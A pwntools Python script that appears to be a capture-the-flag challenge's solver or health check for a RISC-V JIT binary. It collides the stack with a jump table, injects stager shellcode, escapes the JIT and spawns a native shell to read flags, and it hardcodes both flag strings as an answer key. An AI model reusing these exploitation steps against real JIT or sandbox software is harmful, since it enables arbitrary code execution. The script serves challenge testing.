#!/usr/bin/env python

from pwn import *

FLAG1 = b"CSR{n3st1ng_g0_[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[}"
FLAG2 = b"CSR{m4k3_5ur3_90u_ch3ck_807h_80un55}"

# Connect
if args.LOCAL:
    p_args = ["../Challenge/riscv-jit"]
    if args.V:
        p_args.append("-v")
    p_args.append("../Challenge/b2json.bin")

    if args.GDB:
        p = gdb.debug(p_args, cwd="../Challenge/")
    else:
        p = process(p_args, cwd="../Challenge/")

else:
    p = remote(sys.argv[1], int(sys.argv[2]))

# Move stack downwards, to almost collide with jump table
p.send(p8(5) + p32(2))
for i in range(2013):
    p.send(p8(5) + p32(1))

# Collide stack with jump table, overwrite entry 5 with 0x3b0
p.send(p8(3) + p32(0x3B0))

# Trigger read syscall into code segment
p.send(p8(5))

# Send stager shellcode
sc = read("sc1.bin")
assert len(sc) <= 0x3E0
p.send(b"AAAA" + sc.ljust(0x3E0, b"A"))

# Verify first flag
assert FLAG1 in p.recvuntil(b"}")
success("First flag success")

# Send exploit
sc = b"\x0f\x10\x00\x00" + read("exploit2.bin")
assert len(sc) <= 0x2000
p.send(sc)
sleep(2)

# Send native shellcode
context.update(arch="amd64", bits=64, endian="little")
payload = b"\x90" * 0x100 + asm(shellcraft.sh())
p.send(payload)
sleep(2)

# Verify second flag
p.sendline(b"cat flag_jit.txt")
assert FLAG2 in p.recvuntil(b"}")
success("Second flag success")

success("Health check success")
